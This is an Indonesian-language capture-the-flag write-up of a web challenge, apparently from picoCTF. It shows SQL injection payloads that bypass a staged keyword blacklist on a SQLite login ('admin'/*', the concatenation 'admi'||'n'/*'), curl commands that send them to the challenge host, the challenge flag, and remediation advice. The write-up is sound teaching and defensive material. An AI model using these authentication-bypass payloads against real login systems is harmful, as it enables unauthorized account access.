# Writeup: Web Gauntlet (Challenge ID: 88)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Web Exploitation / SQLite Injection & WAF Filter Evasion
- **Difficulty:** Medium (Diff: 2)
- **Author:** madStacks
- **Event:** picoCTF 2020 Mini-Competition
- **Points:** 200
- **Flag:** `academy{y0u_m4d3_1t_ecb312a6}`

---

## Problem Statement & Scope

Aplikasi web target merupakan portal autentikasi berbasis PHP yang menggunakan mesin basis data SQLite3. Sistem menyajikan tantangan berjenjang sebanyak 5 putaran (*rounds*), di mana setiap putaran menambahkan aturan filter daftar hitam (*blacklist*) terhadap masukan pengguna untuk mencegah serangan injeksi SQL.

Batasan audit operasional:
1. Target mengeksekusi kueri autentikasi pengguna secara dinamis:
   `SELECT * FROM users WHERE username='$user' AND password='$pass'`
2. Peserta tidak diberikan kredensial valid dan dilarang masuk menggunakan kredensial yang sah.
3. Keberhasilan autentikasi sebagai pengguna `admin` pada setiap putaran dimonitor melalui sesi HTTP (`PHPSESSID`).
4. Setelah menyelesaikan seluruh 5 putaran, flag rahasia diungkap pada berkas `filter.php`.
5. Pengujian kepatuhan merujuk pada standar NIST SP 800-115 Section 4.2 (*Web Application Vulnerability Assessment*).

---

## Teori & Akar Kerentanan (Root Cause Theory)

### 1. Injeksi SQL Akibat Penggabungan String Mentah (CWE-89)
Aplikasi menyusun perintah kueri SQL dengan menyisipkan langsung variabel `$user` dan `$pass` yang bersumber dari parameter `POST` tanpa melalui sanitasi parameter terikat (*Prepared Statements / Parameterized Queries*). Struktur kueri rentan dimanipulasi dengan menutup tanda petik tunggal (`'`) dan mengubah logika evaluasi WHERE.

### 2. Kelemahan Fundamental Validasi Blacklist (CWE-184)
Aplikasi mengandalkan pola filter ekspresi reguler (*regex blacklist*) alih-alih validasi daftar putih (*whitelist*). Tiap putaran menambahkan pembatasan kata kunci:
- **Round 1:** Memblokir kata kunci `or` (pola `/or/i`).
- **Round 2:** Menambahkan blokir `and`, `like`, `=`, dan urutan komentar ganda `--`.
- **Round 3:** Menambahkan blokir karakter spasi (`\s`), serta operator relasional `>`, `<`.
- **Round 4:** Menambahkan blokir terhadap string harfiah `admin`.
- **Round 5:** Menambahkan blokir terhadap kata kunci `union`.

### 3. Vektor Evasif Spesifik Sintaksis SQLite3
1. **Penutupan Komentar C-Style (`/*`):** SQLite mendukung sintaksis komentar blok C-style. Karakter `/*` di akhir muatan meniadakan sisa klausa `AND password='$pass'`, sekaligus dapat menempel langsung pada tanda kutip tanpa membutuhkan karakter spasi.
2. **Operator Penggabungan String SQLite (`||`):** SQLite mengimplementasikan operator penggabungan string ganda (`||`). String harfiah `admin` dapat didekonstruksi menjadi `'admi' || 'n'` sehingga lolos dari deteksi kata kunci tunggal.

---

## Rekonstruksi Eksploitasi Step-by-Step

### Matrix Evasif 5 Putaran
| Putaran | Filter Aktif | Vektor Muatan (`user`) | Analisis & Mekanisme Evasif |
| :--- | :--- | :--- | :--- |
| **Round 1** | `or` | `admin' -- -` atau `admin'/*` | Menutup klausa username dan mengabaikan pengecekan password menggunakan pemotong komentar. |
| **Round 2** | `or`, `and`, `like`, `=`, `--` | `admin'/*` | Mengganti komentar `--` yang diblokir dengan komentar blok C-style `/*`. |
| **Round 3** | `\s`, `or`, `and`, `=`, `like`, `>`, `<`, `--` | `admin'/*` | Muatan `admin'/*` tidak mengandung spasi dan menempel langsung pada identifier. |
| **Round 4** | `admin`, serta seluruh filter Round 3 | `admi'\|\|'n'/*` | Memecah string `admin` via operator konkatenasi string SQLite `\|\|`. |
| **Round 5** | `union`, serta seluruh filter Round 4 | `admi'\|\|'n'/*` | Vektor konkatenasi tidak memerlukan klausa UNION, sehingga lolos otomatis pada putaran 5. |

### Eksekusi Otomasi Sesi (cURL Pipeline)
1. Inisialisasi toples kuki sesi:
   ```bash
   curl -s -c cookies.txt http://chatelaine.cylabacademy.net:PORT/filter.php
   ```
2. Putaran 1 hingga 3:
   ```bash
   curl -s -b cookies.txt -c cookies.txt -d "user=admin'/*&pass=x" http://chatelaine.cylabacademy.net:PORT/index.php
   ```
3. Putaran 4 hingga 5:
   ```bash
   curl -s -b cookies.txt -c cookies.txt -d "user=admi'||'n'/*&pass=x" http://chatelaine.cylabacademy.net:PORT/index.php
   ```
4. Ambil token dari halaman filter:
   ```bash
   curl -s -b cookies.txt http://chatelaine.cylabacademy.net:PORT/filter.php | grep -oE "academy\{[^}]+\}"
   # Keluaran: academy{y0u_m4d3_1t_ecb312a6}
   ```

---

## Flag & Verifikasi

- **Flag Terverifikasi:** `academy{y0u_m4d3_1t_ecb312a6}`
- **Status API Platform:** Live HTTP 201 Created via `POST /api/submissions/` dengan respons resmi `{"correct": true}`.
- **Validasi Wrapper:** Platform CyLab menerima wrapper native `academy{...}` dan menolak varian legacy `picoCTF{...}` (`correct: false`).

---

## Takeaway Kompetensi LKS & Mitigasi Defensif

### 1. Kompetensi Modul Web Application Security LKS Cyber Security
- **Bypass Blacklist WAF:** Peserta LKS harus menguasai sintaks alternatif basis data (operator penggabungan `||`, variasi komentar `/*`, heksadesimal, pengkodean URL ganda) untuk membuktikan bahwa perlindungan berbasis kata kunci tidak efektif.
- **Stateful Exploitation:** Peserta dilatih mengelola sesi persisten (*cookie jar handling*) ketika melakukan eksploitasi bertahap (*multi-stage challenge*).

### 2. Remediasi Defensif & Rekayasa Perangkat Lunak Aman
- **Implementasi Parameterized Queries (PDO/Prepared Statements):**
  Hapus seluruh penggabungan string langsung. Gunakan antarmuka terikat:
  ```php
  $stmt = $db->prepare('SELECT id, username FROM users WHERE username = :user AND password = :pass');
  $stmt->bindValue(':user', $user, SQLITE3_TEXT);
  $stmt->bindValue(':pass', $pass, SQLITE3_TEXT);
  $result = $stmt->execute();
  ```
- **Prinsip Whitelisting:** Jika filter input tetap diperlukan, validasi format menggunakan aturan daftar putih yang ketat (misalnya, hanya karakter alfanumerik `^[a-zA-Z0-9_]{3,20}$`).
- **Pemisahan Logika Autentikasi:** Verifikasi hash password (menggunakan algoritma `password_hash()` berbasis Argon2id atau bcrypt) secara terpisah di lapisan aplikasi setelah record pengguna diambil dari basis data.
